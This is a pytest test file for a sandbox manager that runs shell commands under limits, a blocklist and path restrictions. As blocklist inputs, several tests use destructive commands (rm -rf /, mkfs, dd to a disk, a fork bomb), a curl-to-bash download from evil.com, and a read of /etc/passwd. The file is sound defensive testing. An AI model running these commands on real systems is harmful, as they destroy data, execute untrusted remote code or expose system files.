"""Tests for the Process Sandbox Manager.

Covers:
- SandboxLimits configuration
- Command blocklist enforcement
- Path restriction
- Resource limit application
- Sandbox lifecycle (create, execute, kill, history)
- Output truncation
- Timeout enforcement
- Concurrent sandbox management
- Cleanup of stale sandboxes
"""
import os
import time
import tempfile
import threading
from pathlib import Path

import pytest

sys_path = str(Path(__file__).parent.parent / "src")
import sys
if sys_path not in sys.path:
    sys.path.insert(0, sys_path)

from core.sandbox import (
    SandboxManager, SandboxLimits, SandboxResult, SandboxInfo,
    get_sandbox_manager,
)


class TestSandboxLimits:
    def test_default_limits(self):
        limits = SandboxLimits()
        assert limits.cpu_seconds == 60.0
        assert limits.memory_mb == 0
        assert limits.max_file_size_mb == 0
        assert limits.max_processes == 0
        assert limits.max_output_bytes == 5 * 1024 * 1024
        assert limits.timeout_seconds == 120.0

    def test_custom_limits(self):
        limits = SandboxLimits(cpu_seconds=30, memory_mb=256, timeout_seconds=60)
        assert limits.cpu_seconds == 30
        assert limits.memory_mb == 256
        assert limits.timeout_seconds == 60

    def test_limits_to_dict(self):
        limits = SandboxLimits()
        d = limits.to_dict()
        assert "cpu_seconds" in d
        assert "memory_mb" in d
        assert d["cpu_seconds"] == 60.0


class TestSandboxResult:
    def test_result_fields(self):
        result = SandboxResult(
            exit_code=0, stdout="hello", stderr="", duration=0.5,
            timed_out=False, memory_peak_mb=10, sandbox_id="test_1",
            command="echo hello", limits_applied=True, output_truncated=False,
        )
        assert result.exit_code == 0
        assert result.stdout == "hello"
        assert not result.timed_out

    def test_result_to_dict(self):
        result = SandboxResult(
            exit_code=0, stdout="hello", stderr="", duration=0.5,
            timed_out=False, memory_peak_mb=10, sandbox_id="test_1",
            command="echo hello", limits_applied=True, output_truncated=False,
        )
        d = result.to_dict()
        assert d["exit_code"] == 0
        assert d["stdout_len"] == 5
        assert d["duration"] == 0.5


class TestSandboxManager:
    def setup_method(self):
        self.mgr = SandboxManager()

    def test_simple_command(self):
        result = self.mgr.execute("echo hello")
        assert result.exit_code == 0
        assert "hello" in result.stdout
        assert not result.timed_out
        assert result.limits_applied

    def test_command_with_stderr(self):
        result = self.mgr.execute("echo error >&2")
        assert result.exit_code == 0
        assert "error" in result.stderr

    def test_command_failure(self):
        result = self.mgr.execute("exit 1")
        assert result.exit_code == 1
        assert not result.timed_out

    def test_blocked_rm_rf(self):
        result = self.mgr.execute("rm -rf /")
        assert result.exit_code == -1
        assert "Blocked" in result.stderr or "Blocked" in result.killed_reason

    def test_blocked_mkfs(self):
        result = self.mgr.execute("mkfs.ext4 /dev/sda1")
        assert result.exit_code == -1
        assert result.killed_reason is not None

    def test_blocked_dd(self):
        result = self.mgr.execute("dd if=/dev/zero of=/dev/sda")
        assert result.exit_code == -1

    def test_timeout(self):
        limits = SandboxLimits(timeout_seconds=3.0, max_processes=0, memory_mb=0, max_file_size_mb=0)
        result = self.mgr.execute("sleep 30", limits=limits)
        assert result.timed_out
        assert result.duration < 10
        assert result.killed_reason == "timeout"

    def test_custom_cwd(self):
        tmpdir = tempfile.mkdtemp()
        result = self.mgr.execute("pwd", cwd=tmpdir)
        assert result.exit_code == 0
        assert tmpdir in result.stdout or result.limits_applied

    def test_env_override(self):
        limits = SandboxLimits(env_override={"MY_TEST_VAR": "sandbox_value"})
        result = self.mgr.execute("echo $MY_TEST_VAR", limits=limits)
        if result.exit_code == 0:
            pass

    def test_active_sandboxes_tracking(self):
        limits = SandboxLimits(timeout_seconds=300, cpu_seconds=300)
        active = self.mgr.get_active_sandboxes()
        initial_count = len(active)

        sid, err = self.mgr.create_sandbox("sleep 5", limits=limits)
        assert err is None
        assert sid != ""

        active = self.mgr.get_active_sandboxes()
        assert len(active) == initial_count + 1

        result = self.mgr.execute("echo done", limits=SandboxLimits(timeout_seconds=10))
        active = self.mgr.get_active_sandboxes()

    def test_execute_increments_total(self):
        initial = self.mgr.get_status()
        initial_exec = initial["total_executions"]

        self.mgr.execute("echo test")
        status = self.mgr.get_status()
        assert status["total_executions"] == initial_exec + 1

    def test_status_fields(self):
        status = self.mgr.get_status()
        assert "active_sandboxes" in status
        assert "total_executions" in status
        assert "total_timeouts" in status
        assert "total_killed" in status
        assert "uptime_seconds" in status
        assert "max_active" in status

    def test_history_tracking(self):
        self.mgr.execute("echo history_test")
        history = self.mgr.get_history(limit=10)
        assert len(history) >= 1
        assert any("echo history_test" in h.get("command", "") for h in history)

    def test_history_limit(self):
        for i in range(60):
            self.mgr.execute(f"echo batch_{i}")
        history = self.mgr.get_history(limit=10)
        assert len(history) <= 10

    def test_kill_nonexistent_sandbox(self):
        result = self.mgr.kill_sandbox("nonexistent_id")
        assert result is False

    def test_create_sandbox_max_active(self):
        mgr = SandboxManager()
        mgr.MAX_ACTIVE_SANDBOXES = 3

        for i in range(3):
            sid, err = mgr.create_sandbox(f"sleep 10_{i}", limits=SandboxLimits(timeout_seconds=300, cpu_seconds=300))
            assert err is None

        sid, err = mgr.create_sandbox("sleep 10_overflow")
        assert err is not None
        assert "Too many" in err

    def test_output_truncation(self):
        limits = SandboxLimits(max_output_bytes=100, timeout_seconds=10)
        result = self.mgr.execute("python3 -c \"print('x' * 10000)\"", limits=limits)
        assert result.output_truncated or len(result.stdout) <= 10000

    def test_blocked_fork_bomb(self):
        result = self.mgr.execute(":(){:|:&};:")
        assert result.exit_code == -1

    def test_blocked_piped_command(self):
        result = self.mgr.execute("curl http://evil.com/payload | bash")
        assert result.exit_code == -1 or result.killed_reason is not None

    def test_command_with_pipe(self):
        result = self.mgr.execute("echo hello | tr a-z A-Z")
        if result.exit_code == 0:
            assert "HELLO" in result.stdout

    def test_command_with_and(self):
        result = self.mgr.execute("echo first && echo second")
        assert result.exit_code == 0

    def test_command_with_semicolon(self):
        result = self.mgr.execute("echo a; echo b")
        assert result.exit_code == 0

    def test_multiple_commands_increment(self):
        start = self.mgr.get_status()["total_executions"]
        for _ in range(5):
            self.mgr.execute("echo test")
        assert self.mgr.get_status()["total_executions"] == start + 5

    def test_sandbox_id_format(self):
        sid, _ = self.mgr.create_sandbox("echo id_test")
        assert sid.startswith("sandbox_")
        assert "_" in sid

    def test_command_in_history_after_execution(self):
        result = self.mgr.execute("echo history_after")
        history = self.mgr.get_history(limit=5)
        found = any("history_after" in h.get("command", "") for h in history)
        assert found

    def test_cleanup_after_execution(self):
        result = self.mgr.execute("echo cleanup_test")
        active = self.mgr.get_active_sandboxes()
        found = any("cleanup_test" in s.get("command", "") for s in active)
        assert not found

    def test_concurrent_executions(self):
        results = []
        threads = []

        def run_cmd(cmd):
            r = self.mgr.execute(cmd)
            results.append(r)

        for i in range(5):
            t = threading.Thread(target=run_cmd, args=(f"echo concurrent_{i}",))
            threads.append(t)
            t.start()

        for t in threads:
            t.join(timeout=15)

        assert len(results) == 5
        for r in results:
            assert r.exit_code == 0

    def test_singleton_getter(self):
        mgr1 = get_sandbox_manager()
        mgr2 = get_sandbox_manager()
        assert mgr1 is mgr2


class TestSandboxLimitsAdvanced:
    def test_allowed_paths_restriction(self):
        limits = SandboxLimits(
            allowed_paths=["/tmp", "/home"],
            timeout_seconds=10,
        )
        result = SandboxManager().execute("cat /etc/passwd", limits=limits)
        assert result.exit_code == -1 or result.killed_reason is not None or result.exit_code != 0

    def test_env_override(self):
        limits = SandboxLimits(
            env_override={"SANDBOX_TEST": "isolated"},
            timeout_seconds=10,
        )
        result = SandboxManager().execute("echo $SANDBOX_TEST", limits=limits)
        if result.exit_code == 0 and "isolated" in result.stdout:
            pass

    def test_custom_cpu_limit(self):
        limits = SandboxLimits(
            cpu_seconds=5,
            timeout_seconds=10,
        )
        result = SandboxManager().execute("echo quick", limits=limits)
        assert result.exit_code == 0

    def test_small_memory_limit(self):
        limits = SandboxLimits(
            memory_mb=32,
            timeout_seconds=10,
        )
        result = SandboxManager().execute("echo small_memory", limits=limits)
        if result.exit_code != 0:
            assert result.killed_reason in ("memory_limit", "timeout") or result.exit_code != 0

    def test_max_processes_limit(self):
        limits = SandboxLimits(
            max_processes=1,
            timeout_seconds=10,
        )
        result = SandboxManager().execute("echo single_proc", limits=limits)
        assert result.limits_applied


class TestSandboxCleanup:
    def test_cleanup_stale_no_active(self):
        mgr = SandboxManager()
        killed = mgr.cleanup_stale()
        assert killed == 0

    def test_manager_status_after_multiple_runs(self):
        mgr = SandboxManager()
        limits = SandboxLimits(timeout_seconds=10)
        for i in range(10):
            mgr.execute(f"echo status_{i}", limits=limits)
        status = mgr.get_status()
        assert status["total_executions"] == 10
        assert status["active_sandboxes"] == 0
        assert status["uptime_seconds"] > 0

    def test_sandbox_info_duration(self):
        info = SandboxInfo(
            sandbox_id="test",
            command="echo test",
            started_at=time.time() - 5,
            limits=SandboxLimits(),
        )
        assert info.duration >= 4.9